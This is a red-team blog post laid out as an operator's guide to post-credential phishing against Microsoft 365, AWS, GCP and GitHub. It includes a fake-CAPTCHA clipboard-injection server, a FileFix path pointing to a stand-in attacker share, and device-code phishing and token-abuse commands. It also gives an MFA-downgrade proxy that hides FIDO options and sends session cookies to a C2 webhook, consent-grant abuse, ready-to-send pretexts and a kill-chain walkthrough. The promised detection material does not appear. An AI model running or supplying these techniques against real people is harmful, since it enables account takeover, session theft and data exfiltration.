---
title: "Living Off the User — A Red Team Guide to Post-Credential Phishing"
description: "The complete operator's guide to modern identity-layer phishing: ClickFix, Device Code Phishing, MFA Downgrade, Consent Grant Manipulation, and Living-Off-the-User execution across Azure, AWS, GCP, and GitHub. No malware. No exploits. Just trust abuse."
author: 0xnegan
date: 2026-04-03 10:00:00 +0200
categories: [Red Team, Offensive Phishing]
tags: [phishing, red-team, cloud-security, mfa-bypass, opsec, azure, aws, gcp, mitre-attack, identity-attacks, oauth, device-code, consent-grant, clickfix, living-off-the-user]
pin: true
image:
  path: /assets/img/living-off-the-user/banner.png
  alt: "Living Off the User — Post-Credential Phishing Attack Architecture"
---

> *I'm [0xNegan](https://www.linkedin.com/in/ahmed-13b6bb279) — Red Team Operator and Cloud Security Researcher.* This is the guide I wish existed when I started thinking about phishing beyond credentials. Modern adversaries don't steal passwords anymore — they steal sessions, tokens, and consent grants. They don't exploit software — they exploit the user's own actions against legitimate systems. This post maps every technique, every decision point, and every OPSEC consideration into a single operator's framework. Red teamers get tradecraft. Blue teamers get detection playbooks. Everyone walks away understanding why the phishing problem just got significantly worse.

## The Problem: Credentials Aren't Enough Anymore

Here's the uncomfortable reality — stealing a username and password in 2026 gets you almost nothing.

Every mature organization has deployed MFA. Conditional Access policies lock down sign-ins by device, location, and risk score. Token lifetimes are measured in minutes. Session cookies carry device-bound attestation. The traditional phishing playbook — clone a login page, harvest credentials, replay them — hits a wall the moment the authentication flow expects a second factor the attacker doesn't control.

So adversaries adapted. They stopped targeting *what the user knows* and started targeting *what the user does*.

This shift created two classes of modern phishing techniques that this post breaks down in their entirety:

**Identity-Layer Attacks** — Techniques that intercept, redirect, or manipulate authentication flows to capture tokens, sessions, and persistent API access. This includes AiTM session hijacking, Device Code Phishing, Consent Grant abuse, and MFA Downgrade tradecraft.

**Living-Off-the-User (LOU) Execution** — Techniques that weaponize the user's own actions against legitimate system functionality. No malware signatures. No exploit code. The user becomes the execution engine — copying commands to their clipboard, pasting into Run dialogs, approving OAuth prompts they don't understand, or clicking through disguised consent flows.

The result? Full account takeover, persistent API access, and arbitrary code execution — all without dropping a single binary on disk.

## The Attack Decision Matrix

Before diving into technique specifics, every operator needs a decision framework. The wrong technique against the wrong target wastes time and burns infrastructure.

```
                    ┌─────────────────────────────┐
                    │   What's the target using?   │
                    └──────────────┬──────────────┘
                                   │
                    ┌──────────────▼──────────────┐
                    │     MFA Type Assessment      │
                    └──────────────┬──────────────┘
                                   │
              ┌────────────────────┼────────────────────┐
              ▼                    ▼                    ▼
        ┌───────────┐      ┌───────────┐      ┌──────────────┐
        │ TOTP/SMS/ │      │ FIDO2/    │      │  No MFA /    │
        │   Push    │      │ Passkeys  │      │  Weak Policy │
        └─────┬─────┘      └─────┬─────┘      └──────┬───────┘
              │                  │                    │
              ▼                  ▼                    ▼
        ┌───────────┐    ┌──────────────┐     ┌──────────────┐
        │  AiTM /   │    │ MFA          │     │  Credential  │
        │  Evilginx │    │ Downgrade    │     │  Harvest +   │
        │  (Session │    │ (force TOTP) │     │  Replay      │
        │   Steal)  │    │ then AiTM    │     │              │
        └───────────┘    └──────────────┘     └──────────────┘
              │                  │                    │
              │       ┌─────────┼─────────┐          │
              │       ▼                   ▼          │
              │  ┌──────────┐    ┌──────────────┐    │
              │  │ Device   │    │ Consent      │    │
              │  │ Code     │    │ Grant        │    │
              │  │ Phish    │    │ (Persistent  │    │
              │  │ (Bypass  │    │  API Access) │    │
              │  │ ALL MFA) │    │              │    │
              │  └──────────┘    └──────────────┘    │
              │                                      │
              └──────────────────┬───────────────────┘
                                 │
                    ┌────────────▼────────────┐
                    │   Post-Access Actions   │
                    │  ┌──────────────────┐   │
                    │  │ LOU Execution    │   │
                    │  │ (ClickFix/       │   │
                    │  │  FileFix/HtaFix) │   │
                    │  └──────────────────┘   │
                    └─────────────────────────┘
```

The logic is straightforward:

| Target Environment | Recommended Primary | Recommended Fallback | Why |
|---|---|---|---|
| TOTP / SMS / Push MFA | AiTM (Evilginx) | Device Code Phishing | AiTM captures session cookies post-MFA. Device Code bypasses all MFA types entirely. |
| FIDO2 / Passkeys / WebAuthn | MFA Downgrade → AiTM | Device Code Phishing | FIDO2 is domain-bound — can't proxy it. Force the user to a weaker method first. |
| Cloud-heavy (M365, AWS, GCP) | Device Code Phishing | Consent Grant | Device Code gives you tokens without ever touching MFA. Consent Grant gives persistent API access. |
| Code Execution Required | LOU Techniques | Drive-By Download | ClickFix/FileFix achieve execution via legitimate OS functions. No malware binary needed. |

---

## Part 1: Living-Off-the-User (LOU) Execution

LOU techniques represent a fundamental shift in offensive phishing. Instead of delivering malware that executes on the victim's machine (which triggers EDR, AMSI, and behavioral analysis), LOU techniques convince the user to execute commands *themselves* using legitimate system functionality.

The user becomes the payload delivery mechanism. No exploit. No dropper. No signature.

### 1.1 ClickFix — Fake CAPTCHA to Clipboard Injection

ClickFix is deceptively simple and devastatingly effective. The victim lands on what appears to be a Cloudflare Turnstile CAPTCHA verification page. When they click the checkbox to "verify they're human," JavaScript silently copies a PowerShell command to their clipboard. The page then instructs them to press `Win+R`, paste, and hit Enter — framing it as part of the verification process.

**Architecture:**

```
┌────────────────────────────────┐
│         VICTIM'S BROWSER       │
│                                │
│  ┌──────────────────────────┐  │
│  │  Fake Cloudflare CAPTCHA │  │
│  │  ┌────────────────────┐  │  │
│  │  │  ☐ Verify you are  │  │  │
│  │  │     human          │──┼──┼──► JS: navigator.clipboard.writeText(PAYLOAD)
│  │  └────────────────────┘  │  │
│  │                          │  │
│  │  "Verification failed.   │  │
│  │   Press Win+R, paste,    │  │
│  │   and press Enter to     │  │
│  │   complete verification" │  │
│  └──────────────────────────┘  │
│                                │
│  User follows instructions:    │
│  Win+R → Ctrl+V → Enter        │
│         │                      │
│         ▼                      │
│  ┌──────────────────────────┐  │
│  │  PowerShell executes     │  │
│  │  attacker's payload      │  │
│  │  (reverse shell, beacon, │  │
│  │   data exfil, etc.)      │  │
│  └──────────────────────────┘  │
└────────────────────────────────┘
```

**How It Works:**

1. Victim receives a phishing email with a link to "verify document access" or similar pretext
2. Landing page shows a blurred document background with a modal requiring "human verification"
3. The modal mimics Cloudflare Turnstile — complete with the Cloudflare logo, spinner animation, and checkbox
4. On checkbox click, JavaScript calls `navigator.clipboard.writeText()` with the encoded payload
5. The page updates to show "Verification requires manual confirmation" with step-by-step instructions to open the Run dialog
6. The victim, conditioned by years of legitimate CAPTCHA interactions, follows the instructions
7. PowerShell executes the clipboard contents — which is the attacker's payload

**Why It Works:**

- Users are conditioned to complete CAPTCHA challenges without questioning them
- The clipboard write happens invisibly — no popup, no permission prompt in most browsers
- The payload executes through `Win+R` (Run dialog), which is a legitimate OS function — not flagged by most EDR
- No file is written to disk. No binary is downloaded. The execution chain is entirely user-driven

**Server Implementation:**

The ClickFix server is a minimal Flask application serving two routes — a landing page with the blurred document and the CAPTCHA page with the clipboard injection logic:

```python
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

@app.route("/")
def landing():
    """Landing page with blurred document background"""
    return render_template("landing.html")

@app.route("/captcha")
def captcha():
    """Fake CAPTCHA with clipboard injection"""
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    return render_template("captcha.html", visitor_ip=visitor_ip)

@app.route("/verify", methods=["POST"])
def verify():
    data = request.json or {}
    token = data.get("token", "")
    if token:
        return jsonify({"success": True, "message": "Verified successfully!"})
    return jsonify({"success": False, "message": "No token provided"}), 400

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080, debug=True,
            ssl_context=('cert.pem', 'key.pem'))
```

The critical logic lives in `captcha.html` where the JavaScript handles checkbox interaction and clipboard write. The payload is typically a Base64-encoded PowerShell one-liner that downloads and executes a second-stage implant, or establishes a direct reverse shell.

**ATT&CK Mapping:** T1204.001 (User Execution — Malicious Link)

---

### 1.2 FileFix — Fake File Share to Explorer Execution

FileFix takes a different approach to user-driven execution. Instead of a CAPTCHA, it mimics a file-sharing platform (OneDrive, SharePoint, Google Drive). The victim sees what looks like a shared file with a path they need to copy to access it. The "path" is actually a command that executes when pasted into the Windows Explorer address bar.

**The Mechanism:**

1. Victim receives "Someone shared a document with you" email
2. Clicks link → lands on fake file-sharing page showing a document preview
3. Page displays: "To access this file, copy the path below and paste it into your File Explorer"
4. The "path" is actually: `\\attacker-server\share\payload.exe` or a command using `explorer.exe` shell execution
5. When pasted into Explorer's address bar + Enter, the command executes

Explorer's address bar accepts not just file paths but also URIs and shell commands — a feature most users don't know about and most security controls don't monitor.

**ATT&CK Mapping:** T1204.001 (User Execution — Malicious Link)

---

### 1.3 Double Clickjacking — Consent Grant via UI Overlay

This is one of the most elegant LOU techniques. It combines traditional clickjacking with OAuth consent grants to achieve persistent API access through two seemingly innocent clicks.

**Architecture:**

```
┌─────────────────────────────────────────────────┐
│                VICTIM'S BROWSER                  │
│                                                  │
│  ┌───────────────────────────────────────────┐   │
│  │          VISIBLE LAYER (z-index: 2)       │   │
│  │                                           │   │
│  │   ┌───────────────────────────────────┐   │   │
│  │   │    "Verify you're not a robot"    │   │   │
│  │   │                                   │   │   │
│  │   │   Click 1: [ I'm not a robot ☐ ] │───┼───┼──► Moves overlay on click
│  │   │   Click 2: [ Continue ▶ ]         │───┼───┼──► Lands on hidden "Accept"
│  │   │                                   │   │   │
│  │   └───────────────────────────────────┘   │   │
│  └───────────────────────────────────────────┘   │
│                                                  │
│  ┌───────────────────────────────────────────┐   │
│  │       HIDDEN LAYER (z-index: 1)           │   │
│  │       opacity: 0 / pointer-events: none   │   │
│  │                                           │   │
│  │   ┌───────────────────────────────────┐   │   │
│  │   │  Microsoft OAuth Consent Prompt   │   │   │
│  │   │                                   │   │   │
│  │   │  "App X wants to access:"         │   │   │
│  │   │  ✓ Read your mail                 │   │   │
│  │   │  ✓ Read your files                │   │   │
│  │   │  ✓ Send mail as you               │   │   │
│  │   │                                   │   │   │
│  │   │  [ Accept ] ◄── Aligned with      │   │   │
│  │   │              "Continue" button     │   │   │
│  │   └───────────────────────────────────┘   │   │
│  └───────────────────────────────────────────┘   │
└─────────────────────────────────────────────────┘
```

**How It Works:**

1. The attacker's page loads two layers — a visible CAPTCHA-style overlay and a hidden iframe containing a real OAuth consent prompt
2. First click on "I'm not a robot" — triggers JavaScript that repositions the overlay, exposing the hidden consent page's "Accept" button beneath the visible "Continue" button
3. Second click on "Continue" — actually clicks the real Microsoft "Accept" button in the hidden iframe
4. The victim has now granted the attacker's OAuth application persistent access to their mailbox, files, and more — without ever seeing the consent prompt

**Why It's Dangerous:**

- Two clicks. That's all it takes.
- The consent grant persists until explicitly revoked by an admin
- The attacker's app can now access the victim's resources via Microsoft Graph API indefinitely
- No credentials are captured — the attack targets authorization (AuthZ), not authentication (AuthN)
- Standard phishing training doesn't cover this — users are taught to check URLs and avoid entering passwords, not to distrust CAPTCHA flows

**ATT&CK Mapping:** T1098.003 (Additional Cloud Credentials — OAuth App)

---

### 1.4 Additional LOU Variants

**HtaFix** — Delivers an HTA (HTML Application) file that executes via `mshta.exe`. HTA files run with full trust in the Windows security model and can execute VBScript or JScript with the same privileges as a native application. The user simply opens the file.

**Drive-By Download** — Auto-downloads an executable disguised as legitimate software (e.g., a VPN client installer). The fake download page mimics the branding of the target organization's actual software portal.

**Calendar Invite Injection** — Generates `.ics` calendar files with embedded phishing URLs as the meeting join link. When the calendar invite auto-populates, the meeting URL appears as a legitimate calendar entry.

**Invisible Encoding** — Uses Unicode steganography (soft hyphens `U+00AD`, zero-width characters `U+2062`/`U+2064`) to embed hidden payloads in email subject lines. The subject appears normal to humans but evades signature-based content filtering by breaking string patterns.

```python
# Unicode steganography constants
SOFT_HYPHEN = '\u00AD'   # Inserted between visible chars (breaks signatures)
BIT_0 = '\u2062'         # Invisible Times (represents binary 0)
BIT_1 = '\u2064'         # Invisible Plus (represents binary 1)

# Process:
# 1. Insert soft hyphens between every character of subject line
# 2. Encode hidden payload as binary → map to zero-width chars
# 3. Append invisible bit stream to obfuscated subject
# 4. MIME Base64-encode the entire subject for email headers
```

---

## Part 2: Identity-Layer Attacks

Identity-layer attacks target the authentication and authorization mechanisms themselves — intercepting tokens, hijacking sessions, manipulating OAuth flows, and downgrading security controls. These techniques are what make modern phishing operations viable against MFA-protected environments.

### 2.1 Device Code Phishing — Bypass ALL MFA Types

Device Code Phishing is, in my assessment, the single most dangerous phishing technique available to red team operators today. It bypasses every type of MFA — TOTP, SMS, push notification, FIDO2, Windows Hello, passkeys — because the victim authenticates fully on their own device, and the attacker simply receives the resulting tokens.

**How OAuth 2.0 Device Code Flow Works:**

The Device Code flow was designed for devices without browsers — smart TVs, IoT devices, CLI tools. The device generates a code, the user enters it on their phone or laptop to authenticate, and the device receives tokens. Attackers weaponize this by generating the code themselves and sending it to the victim under a convincing pretext.

```
┌──────────────┐                ┌───────────────────┐               ┌──────────────┐
│   ATTACKER   │                │  AUTH SERVER       │               │    VICTIM    │
│   CLIENT     │                │  (Azure AD /       │               │    DEVICE    │
│              │                │   AWS SSO / etc.)  │               │              │
└──────┬───────┘                └─────────┬─────────┘               └──────┬───────┘
       │                                  │                                │
       │  1. POST /devicecode             │                                │
       │  client_id + scope               │                                │
       │ ─────────────────────────────►   │                                │
       │                                  │                                │
       │  2. Returns:                     │                                │
       │  user_code + verification_uri    │                                │
       │  + device_code                   │                                │
       │ ◄─────────────────────────────   │                                │
       │                                  │                                │
       │  3. Attacker sends user_code     │                                │
       │  + URL to victim via phishing    │                                │
       │  email / Teams message / etc.    │                                │
       │ ──────────────────────────────────────────────────────────────►  │
       │                                  │                                │
       │                                  │  4. Victim navigates to URL,  │
       │                                  │  enters code, authenticates   │
       │                                  │  with FULL MFA on own device  │
       │                                  │ ◄──────────────────────────── │
       │                                  │                                │
       │  5. Attacker polls /token        │                                │
       │  with device_code                │                                │
       │ ─────────────────────────────►   │                                │
       │                                  │                                │
       │  6. Returns:                     │                                │
       │  access_token + refresh_token    │                                │
       │  + id_token                      │                                │
       │ ◄─────────────────────────────   │                                │
       │                                  │                                │
       │  ATTACKER NOW HAS FULL ACCESS    │                                │
       │  WITHOUT EVER TOUCHING MFA       │                                │
       └──────────────────────────────────┘                                │
```

**The Critical OPSEC Insight:** The attacker never interacts with MFA. The victim completes the full authentication flow — password, TOTP, push notification, FIDO2 key, biometrics, whatever — on their own trusted device. The attacker just receives the tokens at the end. This is why Device Code Phishing is the only technique that bypasses FIDO2/Passkeys without downgrading anything.

### Multi-Cloud Device Code Phishing

This isn't just an Azure attack. Device Code flow exists across every major cloud provider, and each one yields different tokens with different persistence characteristics.

| Cloud Provider | Endpoint | What You Get | Token Lifetime | Persistence Value |
|---|---|---|---|---|
| **Azure / Entra ID** | `login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode` | access_token + refresh_token + id_token (JWT with UPN, TID, OID) | Access: minutes-hours. **Refresh: days-months.** | HIGH — refresh token = persistent access without re-auth |
| **AWS SSO** | boto3 `sso-oidc` → `register_client` + `start_device_authorization` | SSO access token → account list → role enumeration | Session-based | MEDIUM — enumerate all accounts and roles the user can access |
| **GCP** | Google OAuth device code endpoint | access_token + refresh_token for Google APIs | Refresh: indefinite until revoked | HIGH — persistent Google Workspace + GCP access |
| **GitHub** | `github.com/login/device` | access_token (repo, user, org scopes) | Until revoked | HIGH — source code, secrets, CI/CD pipeline access |
| **GitLab** | GitLab instance OAuth endpoint | access_token for GitLab API | Until revoked | HIGH — repository access, CI/CD variables |

**Azure Device Code Phishing — Operator Workflow:**

```bash
# Generate device code targeting Azure/Entra ID
python3 Azure_Device_Code.py -c <CLIENT_ID> -s "User.Read" -t common

# Flags:
#   -c : OAuth Application (Client) ID
#   -s : Scope (e.g., "User.Read", "https://graph.microsoft.com/.default")
#   -t : Tenant ID or 'common' / 'organizations'

# Output includes user_code and verification URI
# Send these to victim via phishing email under convincing pretext
```

**AWS SSO Device Code Phishing:**

```bash
python3 AWS_Device_Code.py -r us-east-1 -s https://d-xxxxxxxxxx.awsapps.com/start
# -r : AWS Region
# -s : SSO Start URL
# --save : Save tokens to file for later use
```

**Post-Capture Token Operations:**

Once tokens are captured, the operator has a full toolkit for exploitation:

```bash
# Extract all token types (ID, Access, Refresh)
python3 get_tokens.py

# Use refresh token to generate new access tokens (persistence)
python3 new_token.py

# Register a new device in Azure AD using stolen access token
python3 register_device.py --access-token <TOKEN> --name <DEVICE_NAME>

# Azure DevOps: Enumerate profile, organizations, and repositories
python3 get_profile_org_repos.py -t <ACCESS_TOKEN>

# Azure DevOps: Create a Personal Access Token from stolen token
python3 make_pat_usingtoken.py -o <ORG_NAME> -t <ACCESS_TOKEN>
```

**Pretexting for Device Code Phishing:**

The pretext is everything. The victim needs a reason to navigate to a URL and enter a code. The most effective pretexts align with workflows the user already trusts:

- *"IT has deployed a new security tool. Complete enrollment by visiting [URL] and entering code [CODE]."*
- *"Your MFA enrollment has expired. Re-enroll at [URL] using verification code [CODE]."*
- *"A new compliance policy requires device registration. Visit [URL] and enter [CODE] to register your device."*

**ATT&CK Mapping:** T1528 (Steal Application Access Token)

---

### 2.2 MFA Downgrade — Forcing FIDO2 Users to Weaker Methods

FIDO2, WebAuthn, and Passkeys are phishing-resistant by design — the cryptographic challenge is bound to the legitimate domain, so an attacker's proxy domain will fail the verification. This is the one MFA type that AiTM (Evilginx) cannot bypass.

But what if you could force the user away from FIDO2 entirely?

MFA Downgrade tradecraft manipulates the authentication flow to remove FIDO2/Passkeys as an option, forcing the user to fall back to TOTP, push notifications, or SMS — all of which AiTM can intercept.

**Implementation — Cloudflare Worker Reverse Proxy:**

The downgrade is implemented as a Cloudflare Worker that reverse-proxies `login.microsoftonline.com`. The victim accesses the Microsoft login page through YOUR Worker domain, and four simultaneous techniques manipulate the authentication flow:

```
┌──────────────┐     ┌───────────────────────┐     ┌──────────────────────┐
│    VICTIM     │     │  CLOUDFLARE WORKER    │     │  login.microsoft     │
│              │     │  (MFA Downgrade)       │     │  online.com          │
│              │     │                        │     │                      │
│  Enters      │     │  ┌──────────────────┐  │     │                      │
│  credentials ├────►│  │ T1: Rewrite      │  ├────►│  /GetCredentialType  │
│              │     │  │ GetCredentialType │  │     │  isFidoSupported:    │
│              │     │  │ isFido → false    │  │     │  false               │
│              │     │  └──────────────────┘  │     │                      │
│              │     │                        │     │                      │
│  Sees only   │◄────┤  ┌──────────────────┐  │◄────┤  Returns auth        │
│  TOTP/Push   │     │  │ T2: UA Spoofing  │  │     │  methods based on    │
│  options     │     │  │ Non-FIDO UA      │  │     │  "non-FIDO client"   │
│              │     │  └──────────────────┘  │     │                      │
│              │     │                        │     │                      │
│  Completes   │     │  ┌──────────────────┐  │     │                      │
│  weak MFA    │     │  │ T3: JSON Rewrite │  │     │                      │
│              │     │  │ isDefault flags  │  │     │                      │
│              │     │  │ FIDO → false     │  │     │                      │
│  Session     │     │  │ Push → true      │  │     │                      │
│  cookie      │     │  └──────────────────┘  │     │                      │
│  captured ◄──┼─────┤                        │     │                      │
│              │     │  ┌──────────────────┐  │     │                      │
│              │     │  │ T4: CSS Inject   │  │     │                      │
│              │     │  │ Hide FIDO DOM    │  │     │                      │
│              │     │  │ elements         │  │     │                      │
│              │     │  └──────────────────┘  │     │                      │
└──────────────┘     └───────────────────────┘     └──────────────────────┘
                              │
                              ▼
                     ┌──────────────────┐
                     │   C2 WEBHOOK     │
                     │   Receives:      │
                     │   - ESTSAUTH     │
                     │   - ESTSAUTH     │
                     │     PERSISTENT   │
                     │   - Credentials  │
                     │   - Technique    │
                     │     alerts       │
                     └──────────────────┘
```

**The Four Techniques in Detail:**

**Technique 1 — GetCredentialType Body Rewrite:** The Worker intercepts POST requests to `/GetCredentialType` (Microsoft's endpoint for determining available authentication methods). In the response body, it rewrites `isFidoSupported` and `isAccessPassKeySupported` to `false`. The server now believes the client doesn't support FIDO2 or passkeys.

**Technique 2 — User-Agent Spoofing:** The Worker replaces the browser's User-Agent string with a non-FIDO-capable UA. Microsoft's server-side logic uses the UA to determine FIDO2 eligibility — a UA that doesn't match known FIDO-capable browsers triggers fallback to legacy MFA methods.

**Technique 3 — JSON Auth Config Manipulation:** The Worker rewrites the `isDefault` flags in Microsoft's authentication configuration JSON. FIDO/WindowsHello/AccessPass default flags are set to `false`, while PhoneAppNotification (push) is set to `true`. The user sees push notification as the default MFA option instead of their security key.

**Technique 4 — CSS Injection:** As a final failsafe, the Worker injects CSS that hides all FIDO/passkey-related DOM elements (`display: none`). Even if the server still sends FIDO as an option, the user literally cannot see or select it in the UI.

```javascript
// CSS payload injected into Microsoft login page
const FIDO_HIDE_CSS = `
<style>
  div[data-value="FidoKey"],
  div[data-test-cred-id="7"],
  div[aria-label*="security key"],
  div[aria-label*="passkey"],
  div[aria-label*="Face, fingerprint, PIN or security key"],
  button[aria-label*="security key"],
  button[aria-label*="passkey"] {
    display: none !important;
    visibility: hidden !important;
    height: 0 !important;
    overflow: hidden !important;
  }
</style>`;
```

**The Worker also exfiltrates session cookies** (`ESTSAUTH` and `ESTSAUTHPERSISTENT`) to a C2 webhook in real-time, along with technique-specific alerts when each downgrade fires successfully.

**Deployment:**

```
1. Login to dash.cloudflare.com
2. Build → Compute → Workers & Pages → Create Application
3. Create Worker → Start with "Hello World" → Deploy
4. Edit Code → paste worker.js content → Deploy
5. Set webhook URL in 'const webhook' variable
6. Route through custom domain for realistic phishing URL
```

**ATT&CK Mapping:** T1556.006 (Modify Authentication Process — MFA)

---

### 2.3 Consent Grant Manipulation — Persistent API Access Without Credentials

Consent Grant attacks are uniquely dangerous because they don't steal credentials or sessions — they grant the attacker's application persistent API access to the victim's resources. The victim clicks "Accept" on an OAuth consent prompt, and the attacker's app can read their mail, access their files, and send messages on their behalf — indefinitely, until an administrator explicitly revokes the consent.

**Illicit Consent Grant Flow (Azure/Entra ID):**

1. Attacker registers an Azure AD application with broad scopes (`Mail.Read`, `Files.ReadWrite`, `Mail.Send`, etc.)
2. Attacker crafts a URL pointing to Microsoft's OAuth consent page with their app's client ID and requested scopes
3. Victim clicks the link → sees a legitimate Microsoft consent prompt → clicks "Accept"
4. Attacker's app now has persistent access to the victim's resources via Microsoft Graph API
5. The attacker uses the app's credentials (client ID + secret) to query the victim's data at any time

**ConsentFix — Cloudflare Worker-Based Consent Exfiltration:**

ConsentFix is a more sophisticated variant that uses Azure CLI's own client ID to obtain authorization codes from victims:

```
┌──────────────┐    ┌────────────────────┐    ┌──────────────────────┐
│    VICTIM     │    │  CLOUDFLARE WORKER │    │  Microsoft OAuth     │
│              │    │  (ConsentFix)       │    │  (Entra ID)          │
│              │    │                     │    │                      │
│  1. Clicks   │    │  2. Validates       │    │                      │
│  phish link  ├───►│  victim's email     │    │                      │
│              │    │                     │    │                      │
│              │    │  3. Redirects to    │    │                      │
│              │    │  Microsoft OAuth    │    │                      │
│              │    │  using Azure CLI    │    │                      │
│              │    │  client_id:         │    │                      │
│              │    │  04b07795-8ddb-     ├───►│  4. Victim            │
│              │    │  461a-bbee-         │    │  authenticates       │
│              │    │  02f9e1bf7b46       │    │  legitimately        │
│              │    │                     │    │                      │
│  5. OAuth    │◄───┤                     │◄───┤  Redirects to        │
│  redirects   │    │                     │    │  localhost (error)   │
│  to localhost│    │                     │    │                      │
│  (error)     │    │                     │    │                      │
│              │    │                     │    │                      │
│  6. Page     │    │  7. Auth code       │    │                      │
│  instructs   ├───►│  exfiltrated to     │    │                      │
│  victim to   │    │  attacker's C2      │    │                      │
│  paste URL   │    │                     │    │                      │
└──────────────┘    └────────────────────┘    └──────────────────────┘
```

The genius of ConsentFix is using Azure CLI's own client ID (`04b07795-8ddb-461a-bbee-02f9e1bf7b46`), which is a first-party Microsoft application that's already consented in every Azure tenant. This means no admin consent required — the attack works with user-level permissions.

**ATT&CK Mapping:** T1098.003 (Additional Cloud Credentials — OAuth App)

---

### 2.4 AiTM Session Hijacking (Evilginx) — For Completeness

AiTM (Adversary-in-the-Middle) via Evilginx remains the workhorse of modern credential phishing. Evilginx operates as a reverse proxy — the victim interacts with the real login page through the attacker's server, completing the full authentication flow including MFA. The attacker captures the session cookie that's issued after successful authentication.

**What AiTM Captures:**

| Artifact | Description | Offensive Value |
|---|---|---|
| Credentials | Username + password from login form | Immediate credential replay (if no MFA) |
| Session Cookies | Post-MFA session tokens (e.g., ESTSAUTH) | **Full account access** — bypasses TOTP/SMS/Push |
| Bearer Tokens | Access tokens for API calls | Direct API access to cloud resources |

**What AiTM Cannot Bypass:**

FIDO2, WebAuthn, and Passkeys — because the cryptographic challenge is bound to the legitimate domain. The attacker's proxy domain fails the domain verification check. This is why MFA Downgrade exists — to force users off FIDO2 before they reach the AiTM proxy.

**Serverless AiTM Deployment:**

For engagements requiring ephemeral infrastructure, deploy AiTM via Terraform to Cloudflare Workers:

```bash
# Deploy Azure AiTM infrastructure targeting ESTSAUTH cookies
python3 Serverless_AiTM_Kit.py --operation create -c ESTSAUTH

# Deploy infrastructure targeting Primary Refresh Tokens (PRT)
python3 Serverless_AiTM_Kit.py --operation create -c PRT

# Tear down infrastructure post-engagement
python3 Serverless_AiTM_Kit.py --operation destroy -c ESTSAUTH
```

**ATT&CK Mapping:** T1557.003 (Adversary-in-the-Middle), T1539 (Steal Web Session Cookie)

---

## Part 3: Understanding What You're Stealing

Every identity-layer attack ultimately captures some form of token. Understanding what each token does and how long it lasts determines your persistence strategy.

### Token Taxonomy

| Token Type | Lifetime | Purpose | Operator Value |
|---|---|---|---|
| **Access Token** | Minutes to hours | Authenticate API requests | Immediate resource access. Short-lived — use quickly or refresh. |
| **Refresh Token** | Days to months | Generate new access tokens | **Highest value.** Persistent access without re-authentication. Always try to capture. |
| **ID Token** | Short-lived | Contains identity claims (JWT) | Recon — UPN, tenant ID, user object ID. Useful for impersonation. |
| **Session Cookie** | Hours to days | Proves authenticated state to web app | Full web application access. What AiTM captures. |
| **Primary Refresh Token (PRT)** | Long-lived | Device-bound SSO token for Azure AD | **Extremely high value.** SSO across all Azure AD-integrated apps. |

### JWT Anatomy

Access tokens and ID tokens from Azure/Entra ID are JWTs (JSON Web Tokens) — Base64-encoded `header.payload.signature` that you can decode client-side:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.
eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20iLCJpc3MiOiJodHRwczov
L3N0cy53aW5kb3dzLm5ldC97dGVuYW50LWlkfS8iLCJpYXQiOjE3MTE5MDAwMDAsImV4
cCI6MTcxMTkwMzYwMCwic3ViIjoie3VzZXItb2JqZWN0LWlkfSIsInRpZCI6Int0ZW5h
bnQtaWR9IiwidXBuIjoidXNlckBjb21wYW55LmNvbSIsInNjcCI6IlVzZXIuUmVhZCJ9.
{signature}
```

**Key Claims to Extract:**

| Claim | Meaning | Use |
|---|---|---|
| `aud` | Audience — which API the token is for | Tells you what service you can access |
| `iss` | Issuer — who issued the token | Identifies the identity provider and tenant |
| `sub` | Subject — user's object ID | Unique user identifier within the tenant |
| `tid` | Tenant ID | Identifies the Azure AD tenant |
| `upn` | User Principal Name | The user's email / login identity |
| `scp` | Scopes | What permissions the token grants |
| `exp` | Expiration | When the token becomes invalid |

---

## Part 4: The Kill Chain — Putting It All Together

Here's how these techniques chain together in a real engagement. This isn't theoretical — this is the operational workflow.

```
┌──────────────────────────────────────────────────────────────────────┐
│                        ENGAGEMENT KILL CHAIN                         │
│                                                                      │
│  ┌─────────┐    ┌─────────────┐    ┌─────────────┐    ┌──────────┐  │
│  │  RECON   │───►│  WEAPONIZE  │───►│  DELIVER    │───►│ EXPLOIT  │  │
│  │         │    │             │    │             │    │          │  │
│  │ • Target │    │ • Select    │    │ • Phishing  │    │ • User   │  │
│  │   MFA    │    │   technique │    │   email     │    │   action │  │
│  │   type   │    │   per       │    │   with      │    │   (click │  │
│  │ • Cloud  │    │   decision  │    │   pretext   │    │   /paste │  │
│  │   stack  │    │   matrix    │    │ • GoPhish   │    │   /auth) │  │
│  │ • Auth   │    │ • Build     │    │   campaign  │    │          │  │
│  │   flow   │    │   infra     │    │   management│    │          │  │
│  └─────────┘    └─────────────┘    └─────────────┘    └────┬─────┘  │
│                                                            │        │
│  ┌──────────────────────────────────────────────────────────┘        │
│  │                                                                   │
│  │  ┌─────────────┐    ┌─────────────────┐    ┌──────────────────┐  │
│  └─►│  CAPTURE     │───►│  PERSIST         │───►│  POST-ACCESS     │  │
│     │              │    │                  │    │                  │  │
│     │ • Session    │    │ • Refresh token  │    │ • Enumerate      │  │
│     │   cookies    │    │   rotation       │    │   resources      │  │
│     │ • Tokens     │    │ • Consent grant  │    │ • Exfiltrate     │  │
│     │   (access +  │    │   persistence    │    │   data           │  │
│     │    refresh)  │    │ • Device         │    │ • Lateral        │  │
│     │ • Auth codes │    │   registration   │    │   movement       │  │
│     └─────────────┘    └─────────────────┘    └──────────────────┘  │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

### Scenario: Enterprise M365 Engagement

**Phase 1 — Recon:** LinkedIn OSINT reveals the target uses Microsoft 365 with Entra ID. Job postings mention "FIDO2 security keys for privileged accounts." DMARC policy is set to `p=none` (monitoring only — email spoofing possible).

**Phase 2 — Weaponize:** Primary technique: MFA Downgrade (to handle FIDO2 users) chained with AiTM (Evilginx) for session capture. Fallback: Device Code Phishing for targets where MFA Downgrade fails. Post-access: Consent Grant for persistence.

**Phase 3 — Deliver:** GoPhish campaign sends phishing emails in batches (not all at once — avoids volume anomaly detection). Pretext: "IT Security: Your MFA enrollment requires re-verification." Link routes through the MFA Downgrade Cloudflare Worker.

**Phase 4 — Exploit:** Target clicks link → Worker downgrades FIDO2 → user falls back to push notification → completes MFA → Evilginx captures session cookie → attacker has full M365 access.

